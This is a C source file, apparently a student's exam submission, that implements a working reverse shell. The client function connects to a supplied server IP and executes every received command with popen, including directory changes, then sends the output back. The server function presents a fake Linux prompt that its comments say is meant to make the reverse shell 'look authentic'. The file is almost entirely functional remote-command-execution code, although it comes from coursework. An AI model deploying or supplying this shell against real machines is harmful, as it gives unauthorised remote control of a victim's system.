/*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------------------

Project			:	TASK 5 - Server (EXAM)
Author			:	Candidate number 1083
Revision			:	4.0
Description		:	Server and Client function for Server task

--------------------------------------------------------------------------------
//////////////////////////////////////////////////////////////////////////////*/

// INCLUDE HEADER FILE FOR THREADS.C
#include "serverclient.h"

/* FUNCTION ------------------------------------------------------------------*/

void ServerFunction(int iPort, SOCKETS *pSockets){
	// Define server and client address structures
	struct sockaddr_in server_addr = {0}; // Define a struct to hold server addr
	struct sockaddr_in client_addr = {0}; // Define a struct to hold client addr
	socklen_t addr_len = sizeof(client_addr); // Define addr length
	
	// Initialize local variables to 0 
	char szBuffer[MAX_BUFFER_SIZE] = {0}; // Define  to store szBuffer
	ssize_t bBytesReceived = 0; // Number of bytes received from client
	ssize_t bBytesSent = 0; // Number of bytes sent to client
	
	// Create server socket
	pSockets -> iServerSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (pSockets -> iServerSocket == 0) { // invalid data
		printf("Error creating server socket");
		exit(EXIT_FAILURE);
	}
	
	// Configure server's address
	server_addr.sin_family = AF_INET;
	
	// Do not use INADDR_ANY, use loopback
	server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	server_addr.sin_port = htons(iPort);
	
	// Bind sockets
	if (bind(pSockets -> iServerSocket, (struct sockaddr *) // Continue line
	&server_addr, sizeof(server_addr)) < 0) {
	
		// Check if socket binding was successfull
		printf ("Error binding server socket %i\n", errno);
		close (pSockets -> iServerSocket);
		exit (EXIT_FAILURE);
	}
	
	// Listen 
	if (listen(pSockets -> iServerSocket,1) < 0) {
	
		// Check if listening was successfull
		printf ("Error listening on server socket %i\n", errno);
		close (pSockets -> iServerSocket);
		exit (EXIT_FAILURE);
	}
	
	// If everything was successfull, accept client connection
	printf("Server listening on port %d.\n", iPort);
	pSockets -> iClientSocket = accept(pSockets -> iServerSocket, // Continue
	(struct sockaddr *) &client_addr, &addr_len);
	if(pSockets -> iClientSocket < 0){
	
		// Check if accepting client connection was successfull
		printf("Error accepting client connection %i\n", errno);
		close (pSockets -> iServerSocket);
		exit (EXIT_FAILURE);
	}
	
	// If successfull, read input from the standard input
	printf("Client successfully connected.\n");
	while (1){
	
		// Make reverse shell look authentic
		printf("\nLinuxCommand:-$ ");
		
		// Check if reading the input was successfull
		if(fgets(szBuffer, MAX_BUFFER_SIZE -1, stdin) == NULL) {
			printf("Error reading input, exiting program..\n");
		   break;
		}
		
		// Remove the newline character from the szBuffer
		szBuffer[strcspn(szBuffer, "\n")] = '\0';
		
		// Send the input to the client
		bBytesSent = send (pSockets -> iClientSocket, szBuffer, // Continue
		strnlen(szBuffer, MAX_BUFFER_SIZE), 0);
		if (bBytesSent < 0) {
			printf("Error receiving command output %i\n", errno);
		   break;
		} else {
		
			// Received the output from the client's Linux command
			bBytesReceived = recv(pSockets -> iClientSocket, // Continue next line
			szBuffer, MAX_BUFFER_SIZE -1, 0);
			
			// Check if receiving output was successfull
		   if (bBytesReceived < 0){
		   	printf ("Error receiving command %i\n", errno);
		      break;
		      
		   // Check if the client has terminated the connection
		   } else if (bBytesReceived == 0){
		   	printf("client has terminated the connection, exiting...\n");
		      break;
		   }
		   
		   // Terminate the buffer with null character
		   szBuffer[bBytesReceived] = '\0';
		   
		   // Print the output from the client just like in linux terminals
		   printf("\n%s", szBuffer);
		 }
	}
	
	// Close the server and client socket
	close(pSockets -> iClientSocket);
	close(pSockets -> iServerSocket);
	exit(EXIT_SUCCESS);
}

/* FUNCTION ------------------------------------------------------------------*/

void ClientFunction(const char *pszServerIP, int iPort, SOCKETS *pSockets) {
	struct sockaddr_in server_addr = {0}; // define struct to hold server addr
	char szBuffer[MAX_BUFFER_SIZE] = {0}; // define struct to hold buffer
	ssize_t bBytesReceived = 0; // Number of bytes received from server
	ssize_t bBytesSent = 0; // Number of bytes sent to server
	
	// Create a client socket
	pSockets->iClientSocket = socket(AF_INET, SOCK_STREAM, 0);
	
	// Check if creation of socket was successfull
	if (pSockets->iClientSocket == -1) {
		printf("Error creating client socket: %i", errno);
		exit(EXIT_FAILURE);
   }
   
   // Configuring server's address
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(pszServerIP);
	server_addr.sin_port = htons(iPort);
	
   // Check if connection to server was successfull
   if (connect(pSockets->iClientSocket, // Continue to next line
   (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
	printf("Error connecting to server: %i", errno);
		close(pSockets->iClientSocket);
      exit(EXIT_FAILURE);
   }
   
   // Receive data from the server
	printf("Client has connected to server...\n");
	while (1) {
		bBytesReceived = recv(pSockets->iClientSocket, szBuffer, // Continue
		MAX_BUFFER_SIZE - 1, 0);
		
		// Check if command was received
      if (bBytesReceived < 0) {
			printf("Error receiving command: %i\n", errno);
         break;
         
      // Check if the server has terminated the connection
      } else if (bBytesReceived == 0) {
			printf("Server has terminated the connection, exiting...\n");
			break;
      }
      
      // Terminate the szBuffer with NULL character
      szBuffer[bBytesReceived] = '\0';
      printf("Received command: %s\n", szBuffer);
      char *pOutput;
      
      /* I wanted to make a fully functional reverse that can also change 
     	directories. This code checks if the user has entered "cd" to change dir*/
      if (strncmp(szBuffer, "cd ", 3) == 0) {
      
      	// Execute the "cd" command and change the directory + check errors
      	if (chdir(szBuffer + 3) != 0) {
         	perror("Error changing directory");
            pOutput = strdup("Error: Failed to change directory");
         } else {
         	pOutput = strdup("Directory changed successfully");
         }
      } else {
      
      	// Execute other Linux commands from the server
      	pOutput = ExecuteCommand(szBuffer);
      }
      
      // Send the output back to the server and print it
      bBytesSent = send(pSockets->iClientSocket, pOutput, // Continue next line
      strnlen(pOutput, MAX_BUFFER_SIZE - 1), 0);
      
      // Check if the command was sent successfully
      if (bBytesSent < 0) {
      	printf("Error sending command output %i\n", errno);
         free(pOutput); // Free the memory allocated for the output
         break;
      }
      free(pOutput); // Free the memory allocated for the output
	}
   close(pSockets->iClientSocket); // Close the client socket
   exit(EXIT_SUCCESS); // Exit program with success status
}

/* FUNCTION ------------------------------------------------------------------*/

/* This is the function that handles signal received by the program. This 
function is helpful so that the server or client knows when either one presses
CTRL+C and exits gracefully. */
void HandleSignal(int iSignal){

	// Display message when signal is received and exit
	printf("Signal %d received, terminating...\n", iSignal);
	exit(EXIT_SUCCESS);
}

/* FUNCTION ------------------------------------------------------------------*/

/* I changed the given code for reverse shell to handle multiple lines of 
output from the client. */
char *ExecuteCommand(const char *pcszCommand){

	// Declare and intialize variables to 0 and NULL
	FILE *pFile = NULL;
   char szTextLine[MAX_BUFFER_SIZE] = {0};
   int iExit_status = 0;
   size_t bBytesRead = 0;
   size_t bTextLineLength = 0;
   char *pszReturnString = malloc(MAX_BUFFER_SIZE);
   
   // Check and clear if memory allocation for pszReturnString was successfull
   if (pszReturnString == NULL){
   	return NULL;
   }
   memset(pszReturnString, 0, MAX_BUFFER_SIZE);
   
   // open a process by creating a pipe and forking
   pFile = popen(pcszCommand, "r");
   
   // If pFile is NULL, then there was an error executing the command
   if (pFile == NULL){
   	snprintf(pszReturnString, MAX_BUFFER_SIZE, // Continue to next line
   	"Error: Failed to execute command");
   }
   
   /* If successfull, read the output of the command line by line and append
   it to the pszReturnString. This is useful if the server sends a "ls"
   command. */
   else {
      while (fgets(szTextLine, sizeof(szTextLine), pFile) != NULL) {
      
      	// Calculate the length of the line
      	bTextLineLength = strnlen(szTextLine, sizeof(szTextLine));
      	
      	// Check if the output buffer is full
         if (bBytesRead + bTextLineLength + 1 >= MAX_BUFFER_SIZE) {
         break;
         }
         
         // Copy the line into the output buffer (DANGEROUS FUNCTION)
         memcpy(pszReturnString + bBytesRead, szTextLine, bTextLineLength);
         bBytesRead += bTextLineLength;
		}
		
		// Using ferror to check if error has occured when checking the stream
      if (ferror(pFile)) {
      	snprintf(pszReturnString, MAX_BUFFER_SIZE, // Continue to next line
      	"Error: Failed to read output");
      }
      
      // Get the exit status of the child process
      iExit_status = pclose(pFile);
      
		// Check if the child process terminated normally 
      if (WIFEXITED(iExit_status) && WEXITSTATUS(iExit_status) != 0) {
      	snprintf(pszReturnString, MAX_BUFFER_SIZE, "bash: command not found");
      }
      
      // If the output buffer is still empty, command was successfully executed
      if (strnlen(pszReturnString, MAX_BUFFER_SIZE) == 0) {
      	snprintf(pszReturnString, MAX_BUFFER_SIZE, // Continue to next line
      	"Command executed successfully");
      }
   }
   return pszReturnString;
}

/* FUNCTION ------------------------------------------------------------------*/

/* This is a simple clear screen function that was inspired from the cashier
Register task. This function is used in the main to make the program cleaner */ 
void clearScreen(){
	#ifdef _WIN32
	   system("cls");
	#else
	   system("clear");
	#endif
}

/* End of file ---------------------------------------------------------------*/
